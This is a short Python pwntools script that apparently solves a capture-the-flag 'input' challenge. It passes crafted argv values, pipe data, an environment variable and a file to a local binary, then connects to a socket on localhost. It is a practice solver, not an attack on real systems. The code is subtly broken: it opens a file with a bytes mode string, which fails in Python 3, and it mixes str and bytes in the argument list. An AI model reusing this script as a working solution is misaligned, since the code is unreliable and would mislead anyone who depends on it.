from pwn import *
import os
import socket


inp1 = ['A'] * 100

inp1[ord('A')] = "\x00"
inp1[ord('B')] = "\x20\x0a\x0d"
inp1[ord('C')] = b"5001"             # Socket port - Stage 5

fd1, inp_inn = os.pipe()
fd2, inp_err = os.pipe()

os.write(inp_inn, b"\x00\x0a\x00\xff")
os.write(inp_err, b"\x00\x0a\x02\xff")

env = {b"\xde\xad\xbe\xef": b"\xca\xfe\xba\xbe"}

with open("\x0a", b"w") as f:
    f.write("\x00\x00\x00\x00")
    f.close()

p = process(executable="input", argv=inp1, stdin=fd1, stderr=fd2, env=env)

conn = remote("localhost", 5001)
conn.sendline(b"\xde\xad\xbe\xef")

p.interactive()
